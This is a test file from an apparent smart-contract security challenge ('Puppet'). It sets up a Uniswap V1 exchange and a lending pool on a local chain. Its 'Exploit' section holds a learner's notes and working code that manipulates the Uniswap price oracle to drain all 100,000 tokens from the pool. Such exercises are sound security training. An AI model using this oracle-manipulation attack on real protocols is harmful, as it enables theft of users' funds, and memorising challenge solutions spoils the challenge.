const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /**
         * I guess it has something to do with the _computeOraclePrice and calculateDepositRequired in puppetpool
         * calculateDepositRequired
         * -borrowedamount * _computeOraclePrice * 2/10 ** 18
         * _computeOraclePrice
         * -uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
         *  
         * Manipulating the pool i guess 
         * If i trade in all my token for eth , this lowers decreases the balance of the uniswap  and increases the no of token thus reducing the computerOracle Price
         * Directly interact with the contract
         * 
         * Need to steal 100000 DVT tkns
         * 
         * calculating all the prices
         * Usages of the white paper for V1 for calculate the value https://hackmd.io/@HaydenAdams/HJ9jLsfTz#ERC20-%E2%87%84-ERC20-Trades
         * // Sell ERC20 for ETH
            const inputAmount = userInputTokenValue (1000)
            const inputReserve = tokenContract.methods.balanceOf(exchangeAddress).call() theres 10 dvt here
            const outputReserve = web3.eth.getBalance(exchangeAddress) 10 eth here

            // Output amount bought
            const numerator = inputAmount * outputReserve * 997 = 99970000
            const denominator = inputReserve * 1000 + inputAmount * 997 = 1007000
            const outputAmount = numerator / denominator = 99.275


            Eth_pool = 0.099307
            DVT_POOl = 1010

            price of token = 0.099307 /1010 = 0.0000983237 eth
            you want 100000 tokens 
            100000* 0.000099307 * 2 = 19.66475  eth is enough
            But the transaction only does not fail when i put in 20 ether of collateral
            Why is that so?
            I calculated wrongly, we need 20 eth to take everything about of the liquidity pool instead of 2
         * 
         */

        /**
         * What to learn? 
         * Need to learn about Uniswap contract 
         * Automated market maker of x*y = k, so if more tokens the cheaper it is.
         * liquidity provider fee of 0.3%
         * -What are deadlines in uniswap contract?
         *  - Transaction deadlines sets a time after which a transaction can no longer be executed
         *  - This limits miners holding signed transactions for exteneded durations and executing them based on market movements
         *  - It also reduces uncertainty around transactions that take a long time to execute due to issues with gas prices
         * Deadlines are calculated by adding the desired amount of time (in seconds) to the latest Ethereum block timestamp
         * Introduction to swaps
         * https://docs.uniswap.org/concepts/protocol/swaps
         * Input - amount sold 
         * Output - amount bought
         */

        //Exchanging all my tokens for every eth in the exchange 

        //Pretty sure i need to approve the transaction
        this.token.approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);

        //tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline)
        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
        const tx = await this.uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, deadline);
        // const RPC = "RPC_OF_THE_NETWORK";
        // const blockNumber = 1; // number of the block you want to get timestamp of
        // const provider = new ethers.providers.JsonRpcProvider(RPC)

        // const timestamp = (await provider.getBlock(blockNumber)).timestamp;
        const AttackPool = await this.lendingPool.connect(attacker);
        //The borrowing price should be 0
        const attackBal = await ethers.provider.getBalance(attacker.address);
        //100000
        // await AttackPool.borrow(ethers.utils.parseEther(`100000`),{value:attackBal.sub(ethers.utils.parseEther("1"))});
        await AttackPool.borrow(ethers.utils.parseEther(`100000`),{value:ethers.utils.parseEther("20")});

        //my erros was that i did this await AttackPool.borrow(ethers.utils.parseEther(`100000)); without sending any money to the contract
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});